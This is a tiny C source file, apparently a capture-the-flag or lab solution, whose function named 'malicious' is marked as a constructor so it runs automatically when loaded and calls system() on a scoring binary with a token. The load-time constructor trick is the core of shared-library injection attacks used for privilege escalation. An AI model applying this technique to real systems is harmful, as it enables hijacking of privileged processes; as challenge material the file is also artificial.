#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 5f9326bd-6fc1-40f0-a810-b10726da57e7");
}
